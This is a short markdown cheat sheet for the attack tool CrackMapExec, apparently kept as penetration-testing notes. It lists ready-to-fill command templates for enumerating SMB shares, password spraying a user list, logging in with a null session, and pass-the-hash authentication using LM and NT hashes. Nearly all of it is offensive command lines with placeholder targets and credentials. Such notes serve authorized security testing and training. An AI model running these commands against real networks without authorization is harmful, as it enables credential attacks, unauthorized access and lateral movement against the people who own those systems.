# CrackMapExec
[URL] (https://github.com/byt3bl33d3r/CrackMapExec)

## Enumerate SMB Shares
```
[Enumerated SMB Shares] $crackmapexec smb <ip address> --shares -u <username> -p <password>
```

## Password Spray Users
```
[Password Spary User List and Password] $crackmapexec smb <ip address> -u <users.lst> -p <password> --continue-on-success
```

## Null Session
```
crackmapexec smb <target(s)> -u '' -p ''
```

# Pass the Hash
```
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
crackmapexec smb <target(s)> -u username -H NTHASH
```
